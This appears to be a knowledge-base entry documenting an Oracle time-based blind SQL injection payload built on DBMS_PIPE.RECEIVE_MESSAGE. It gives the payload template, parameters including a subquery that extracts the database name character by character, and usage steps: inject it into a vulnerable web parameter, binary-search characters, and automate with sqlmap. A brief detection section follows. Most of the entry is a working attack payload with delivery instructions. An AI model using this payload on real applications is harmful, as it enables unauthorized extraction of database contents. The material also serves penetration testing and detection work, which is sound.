---
id: 14b796fe-e493-4356-a9ac-0f182d98749e
name: Oracle-DBMS-PIPE-RECEIVE-MESSAGE-Delay-Payload
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:35.280246+00:00'
updated_at: '2023-04-10T20:23:10.381670+00:00'
platforms:
  - Oracle Database
tags:
  - sqli
  - payload
  - time-based
validated: true
---

# Oracle-DBMS-PIPE-RECEIVE-MESSAGE-Delay-Payload

## Code

```sql
AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) comment: -- /**/
```

## Description

This SQL code snippet is a payload for time-based blind SQL injection in Oracle databases. It uses the DBMS_PIPE.RECEIVE_MESSAGE function to receive a message from a named pipe, which introduces a delay equal to the specified timeout if no message is present. By conditioning the equality check (e.g., [RANDNUM] representing a data-derived value), the delay only occurs if the condition is true, allowing inference of data based on response time.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| [RANDNUM] | Numeric value or subquery result to compare (e.g., ASCII(SUBSTR((SELECT database_name FROM v$database),1,1))) | 65 |
| [RANDSTR] | Unique name for the pipe (random string to avoid conflicts) | 'abc123' |
| [SLEEPTIME] | Timeout in seconds for the receive operation, creating the delay | 5 |

## Usage

Inject this payload into a vulnerable SQL query parameter in a web application, e.g., id=1 AND (SELECT CASE WHEN (condition) THEN 1 ELSE 0 END)=DBMS_PIPE.RECEIVE_MESSAGE('pipe',5)--. Use in a loop to binary search characters: test if char > 'M' to halve the search space. Automate with tools like sqlmap for efficiency. Typically delivered via HTTP requests to the vulnerable endpoint.

## Detection

- Monitor database logs for DBMS_PIPE.RECEIVE_MESSAGE calls with unusual pipe names or frequent timeouts.
- Web server logs showing requests with SQL keywords or long response times (>5s).
- Anomaly detection in query patterns or pipe usage via Oracle auditing.

## Related

- [[procedures/Oracle-SQL-Injection-Time-Based-Attack]]
- [[tools/sqlmap]]
